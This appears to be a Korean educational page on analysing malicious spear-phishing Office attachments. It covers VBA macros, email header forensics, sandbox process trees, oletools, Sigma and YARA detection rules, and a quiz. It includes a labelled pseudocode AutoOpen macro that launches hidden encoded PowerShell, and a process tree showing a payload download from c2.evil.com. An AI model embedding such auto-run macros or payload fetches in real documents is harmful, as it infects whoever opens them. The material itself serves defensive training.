#1. Office 매크로 코드 분석

📎

VBA AutoOpen 매크로

스피어피싱 첨부파일에서 가장 흔한 공격 벡터는 Office VBA 매크로입니다. AutoOpen() 또는 Document_Open() 프로시저는 문서를 열 때 자동 실행됩니다. 공격자는 이를 통해 PowerShell을 호출하거나, C2 서버에서 추가 페이로드를 다운로드합니다.

malicious_macro.vba
VBA
⚠️ 교육 목적 코드 — 의사 코드 — 실제 악성코드와 다릅니다
' 악성 매크로 의사 코드 (교육용)
Sub AutoOpen()
' 문서 열림 시 자동 실행
Dim cmd As String
cmd = "powershell -ep bypass -w hidden -enc " & payload
Shell cmd, vbHide ' 숨겨진 PowerShell 실행
End Sub
Sub Document_Open()
' AutoOpen의 대체 진입점
AutoOpen
End Sub

#2. 이메일 헤더 포렌식

🔍

SPF, DKIM, DMARC 분석

이메일 헤더에는 발신자 검증 정보가 포함됩니다. SPF(발신 IP 검증), DKIM(디지털 서명), DMARC(정책 적용)를 분석하면 위조된 발신자를 식별할 수 있습니다. Return-Path와 From 헤더가 불일치하면 스푸핑 가능성이 높습니다.

suspicious_header.txt
email header
⚠️ 교육 목적 — 실제 이메일 헤더 분석 예시
Received: from mail-attacker.evil.com (192.168.1.100)
by mx.company.com with SMTP; Mon, 03 Mar 2026
From: ceo@trusted-company.com <-- 위조된 발신자
Return-Path: <attacker@evil.com> <-- 실제 발신자
Authentication-Results: mx.company.com;
spf=fail (sender IP not authorized)
dkim=fail (signature verification failed)
dmarc=fail (p=reject)
X-Originating-IP: 192.168.1.100

#3. 첨부파일 동적 분석

🧪

샌드박스 실행과 프로세스 트리

악성 첨부파일을 격리된 샌드박스(Any.Run, Joe Sandbox 등)에서 실행하면 실제 행위를 관찰할 수 있습니다. 프로세스 트리에서 svchost.exe → WINWORD.EXE → cmd.exe → powershell.exe 체인은 매크로 기반 공격의 전형적 패턴입니다.

process_tree.txt
process tree
⚠️ 교육 목적 — 샌드박스 프로세스 트리 예시
  svchost.exe (PID: 684)
  └── WINWORD.EXE (PID: 3412)  ← 문서 열림
      └── cmd.exe (PID: 5028)   ← 매크로가 cmd 실행
          └── powershell.exe (PID: 6104)  ← 페이로드 다운로드
              ├── Invoke-WebRequest http://c2.evil.com/payload
              └── rundll32.exe (PID: 7210)  ← DLL 실행

#4. OLE 구조와 oletools

🔧

olevba와 oleid로 매크로 추출

oletools는 OLE2 파일(Office 문서)을 분석하는 Python 도구 모음입니다. olevba는 VBA 매크로를 추출하고 위험도를 평가합니다. oleid는 파일의 OLE 속성과 잠재적 위험 지표를 식별합니다. 매크로 없이 실행할 수 있어 안전한 정적 분석이 가능합니다.

oletools_analysis.sh
bash
⚠️ 교육 목적 — 격리된 분석 환경에서만 실행
# olevba: VBA 매크로 추출 및 분석
olevba suspicious_invoice.docm
# 출력 예시:
+----------+--------------------+---------------------------------------------+
| Type | Keyword | Description |
+----------+--------------------+---------------------------------------------+
| AutoExec | AutoOpen | Runs when document is opened |
| Suspicious| Shell | May run an executable |
| Suspicious| powershell | May run PowerShell commands |
| IOC | http://c2.evil.com | URL (potential C2 server) |
# oleid: OLE 파일 속성 확인
oleid suspicious_invoice.docm

#5. Sigma 탐지 규칙

📋

Office에서 의심스러운 자식 프로세스 탐지

정상적인 Office 프로세스는 cmd.exe, powershell.exe, wscript.exe 등을 자식 프로세스로 생성하지 않습니다. Sigma 규칙으로 WINWORD.EXE, EXCEL.EXE 등이 의심스러운 자식 프로세스를 생성하는 것을 탐지할 수 있습니다.

office_child_process.yml
yaml
⚠️ 교육 목적 — Sigma 탐지 규칙 예시
title: Office Application Spawning Suspicious Process
status: production
level: high
description: Detects Office spawning cmd, powershell, wscript
logsource:
category: process_creation
product: windows
detection:
selection_parent:
ParentImage|endswith:
- '\WINWORD.EXE'
- '\EXCEL.EXE'
- '\POWERPNT.EXE'
selection_child:
Image|endswith:
- '\cmd.exe'
- '\powershell.exe'
- '\wscript.exe'
- '\mshta.exe'
condition: selection_parent and selection_child

#6. YARA 규칙 기초

🎯

악성 Office 문서 탐지

YARA 규칙으로 악성 Office 문서를 탐지할 수 있습니다. OLE2 파일의 매직 바이트(D0 CF 11 E0), 의심스러운 VBA 문자열(Shell, PowerShell, WScript.Shell), 난독화 패턴(Chr(), ChrW())을 조합하여 정밀한 탐지가 가능합니다.

detect_malicious_doc.yar
yara
⚠️ 교육 목적 — YARA 탐지 규칙 예시
rule Malicious_Office_Macro {
meta:
author = "ROOT14 EDU"
description = "Detects Office docs with suspicious macros"
strings:
$ole_magic = { D0 CF 11 E0 A1 B1 1A E1 }
$s1 = "AutoOpen" ascii wide
$s2 = "Document_Open" ascii wide
$s3 = "Shell" ascii wide
$s4 = "powershell" ascii wide nocase
$s5 = "WScript.Shell" ascii wide
condition:
$ole_magic at 0 and (1 of ($s1,$s2)) and (1 of ($s3,$s4,$s5))
}

#7. 이메일 보안 게이트웨이

🛡️

SPF/DKIM/DMARC 구현 아키텍처

이메일 보안 게이트웨이는 수신 이메일의 SPF, DKIM, DMARC 검증을 수행합니다. SPF는 DNS TXT 레코드로 허가된 발신 IP를 정의하고, DKIM은 이메일에 디지털 서명을 추가하며, DMARC는 SPF/DKIM 실패 시 적용할 정책(none/quarantine/reject)을 지정합니다.

이메일 인증 플로우

  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
  │  발신 서버    │───→│  수신 MTA     │───→│  사용자 받은편지함│
  │ mail.evil.com│    │ mx.company.com│    │              │
  └──────────────┘    └──────┬───────┘    └──────────────┘
                             │
                    ┌────────┴────────┐
                    │  인증 검증 단계   │
                    ├─────────────────┤
                    │ 1. SPF 검증      │  DNS TXT → IP 허가 확인
                    │ 2. DKIM 검증     │  공개키로 서명 검증
                    │ 3. DMARC 정책    │  실패 시 reject/quarantine
                    └─────────────────┘

#8. 사용자 보안 인식 교육

👥

피싱 시뮬레이션 프로그램

기술적 방어만으로는 스피어피싱을 완전히 차단할 수 없습니다. 사용자 보안 인식 교육과 피싱 시뮬레이션을 통해 인적 방어력을 높여야 합니다. 정기적인 시뮬레이션으로 클릭률(Click Rate)을 측정하고, 반복 교육으로 개선합니다.

피싱 시뮬레이션 핵심 지표

지표 설명 목표
클릭률 (Click Rate) 피싱 링크/첨부파일 클릭 비율 < 5%
신고율 (Report Rate) 의심 이메일 보안팀 신고 비율 > 70%
반복 실패율 2회 이상 피싱에 걸린 사용자 비율 < 2%
평균 신고 시간 피싱 수신 후 신고까지 걸린 시간 < 10분

#10. Mini Lab — 악성 첨부파일 분석 절차

mini-lab-2.sh

악성 첨부파일을 분석하는 올바른 절차를 순서대로 따라가 보세요.

1️⃣
이메일 헤더 확인
먼저 이메일 헤더에서 SPF, DKIM, DMARC 검증 결과를 확인합니다. Return-Path와 From 헤더의 일치 여부, X-Originating-IP 등을 검토합니다.
2️⃣
첨부파일 해시 추출
첨부파일을 열지 않고 SHA-256 해시를 추출합니다. certutil -hashfile 또는 sha256sum 명령을 사용합니다.
3️⃣
VirusTotal 조회
추출한 해시를 VirusTotal에서 조회하여 기존 악성코드 탐지 여부를 확인합니다. 70개 이상의 AV 엔진 결과를 확인할 수 있습니다.
4️⃣
샌드박스 실행
격리된 샌드박스(Any.Run, Joe Sandbox)에서 첨부파일을 실행하여 동적 행위(프로세스 생성, 네트워크 연결, 파일 변경)를 관찰합니다.
5️⃣
매크로 추출 (olevba)
olevba 도구로 VBA 매크로를 추출하고 분석합니다. AutoOpen, Shell, PowerShell 등 의심스러운 키워드와 C2 URL을 식별합니다.
6️⃣
IOC 등록
분석에서 발견된 IOC(파일 해시, C2 도메인/IP, YARA 시그니처)를 위협 인텔리전스 플랫폼(MISP, OpenCTI)에 등록하고 조직 내 공유합니다.

#Q. 종합 퀴즈

Q1. VBA 매크로에서 문서를 열 때 자동 실행되는 프로시저 이름은?

💡 VBA에서 AutoOpen()은 Word 문서가 열릴 때, Document_Open()은 이벤트 핸들러로서 자동 실행됩니다. 두 프로시저 모두 매크로 기반 공격의 진입점으로 사용됩니다.

Q2. SPF 레코드에서 ~all의 의미는?

💡 ~all은 softfail로, 허가 목록에 없는 IP에서 발송된 이메일을 의심스러운 것으로 표시하지만 완전히 차단하지는 않습니다. -all(hard fail)은 완전 차단합니다.

Q3. 샌드박스 분석에서 WINWORD.EXE → cmd.exe → powershell.exe 프로세스 체인이 의미하는 것은?

💡 정상적인 Office 프로세스는 cmd.exe나 powershell.exe를 자식 프로세스로 생성하지 않습니다. 이 패턴은 매크로가 Shell()을 통해 명령어를 실행하는 전형적인 악성 행위입니다.

Q4. oletools의 olevba가 제공하는 핵심 기능은?

💡 olevba는 Office 문서에서 VBA 매크로를 추출하고, AutoExec/Suspicious/IOC 등의 카테고리로 위험도를 평가합니다. 매크로를 실행하지 않고 정적 분석하므로 안전합니다.

Q5. YARA 규칙에서 OLE2 파일의 매직 바이트는?

💡 OLE2(Compound File Binary Format) 파일의 매직 바이트는 D0 CF 11 E0 A1 B1 1A E1입니다. .doc, .xls, .ppt 등 구형 Office 형식에 사용됩니다. PK는 ZIP(Office 2007+), MZ는 PE 실행파일입니다.

Q6. DMARC 정책에서 p=reject의 의미는?

💡 DMARC p=reject는 SPF 또는 DKIM 검증에 실패한 이메일을 수신 서버에서 완전히 거부하도록 지시합니다. p=quarantine은 스팸함 이동, p=none은 모니터링만 수행합니다.

Q7. Sigma 규칙에서 Office의 의심스러운 자식 프로세스를 탐지할 때 사용하는 로그 카테고리는?

💡 process_creation 카테고리는 새 프로세스 생성 이벤트(Sysmon EID 1)를 다룹니다. ParentImage 필드로 부모 프로세스(Office)를, Image 필드로 자식 프로세스(cmd, powershell)를 매칭합니다.

Q8. 피싱 시뮬레이션에서 조직의 목표 클릭률은?

💡 업계 표준에서 피싱 시뮬레이션 클릭률 목표는 5% 미만입니다. 0%는 비현실적이며, 20%를 초과하면 추가적인 보안 인식 교육이 시급합니다.
